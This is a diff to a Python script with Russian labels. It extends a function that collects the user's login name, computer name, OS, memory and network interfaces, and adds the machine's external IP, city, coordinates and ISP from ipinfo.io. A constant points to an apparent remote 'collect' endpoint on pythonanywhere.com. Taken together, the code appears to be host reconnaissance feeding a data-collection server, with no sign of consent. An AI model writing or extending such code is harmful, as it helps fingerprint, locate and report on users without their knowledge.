@@ -13,20 +13,49 @@ SERVER_URL = "http://jkl2.pythonanywhere.com/collect"
 
 
 def collect_system_info():
-    """Собирает подробную информацию о системе, используя psutil и wmic."""
+    """Собирает подробную информацию о системе."""
 
     def bytes_to_gb(bts):
         return round(bts / (1024**3), 2)
 
     try:
-        mem = psutil.virtual_memory()
-        info_lines = [
-            "--- СИСТЕМНАЯ ИНФОРМАЦИЯ ---",
-            f"Имя пользователя: {os.getlogin()}",
-            f"Имя компьютера: {socket.gethostname()}",
-            f"ОС: {platform.platform()}",
-            f"Время сбора данных: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-        ]
+        info_lines = []
+        # Сбор данных через ipinfo.io
+        info_lines.append("--- ВНЕШНИЙ IP-АДРЕС ---")
+        try:
+            response = requests.get("https://ipinfo.io", timeout=5)
+            if response.status_code == 200:
+                ip_data = response.json()
+                key_map = {
+                    "ip": "IP-адрес",
+                    "hostname": "Хостнейм",
+                    "city": "Город",
+                    "region": "Регион",
+                    "country": "Страна",
+                    "loc": "Координаты",
+                    "org": "Провайдер",
+                    "timezone": "Часовой пояс",
+                }
+                for key, label in key_map.items():
+                    value = ip_data.get(key)
+                    if value:
+                        info_lines.append(f"{label}: {value}")
+            else:
+                info_lines.append(
+                    f"Сервис ipinfo.io вернул ошибку: {response.status_code}"
+                )
+        except Exception as e:
+            info_lines.append(f"Не удалось получить информацию: {e.__class__.__name__}")
+
+        info_lines.extend(
+            [
+                "\n--- СИСТЕМНАЯ ИНФОРМАЦИЯ ---",
+                f"Имя пользователя: {os.getlogin()}",
+                f"Имя компьютера: {socket.gethostname()}",
+                f"ОС: {platform.platform()}",
+                f"Время сбора данных: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+            ]
+        )
 
         boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
         uptime = datetime.datetime.now() - boot_time
@@ -41,6 +70,7 @@ def collect_system_info():
             ]
         )
 
+        mem = psutil.virtual_memory()
         info_lines.extend(
             [
                 "\n--- ОПЕРАТИВНАЯ ПАМЯТЬ (ОЗУ) ---",
@@ -81,7 +111,7 @@ def collect_system_info():
             except (PermissionError, FileNotFoundError):
                 continue
 
-        info_lines.append("\n--- СЕТЕВЫЕ ИНТЕРФЕЙСЫ ---")
+        info_lines.append("\n--- ЛОКАЛЬНЫЕ СЕТЕВЫЕ ИНТЕРФЕЙСЫ ---")
         for iface_name, iface_addresses in psutil.net_if_addrs().items():
             info_lines.append(f"Интерфейс: {iface_name}")
             for addr in iface_addresses:
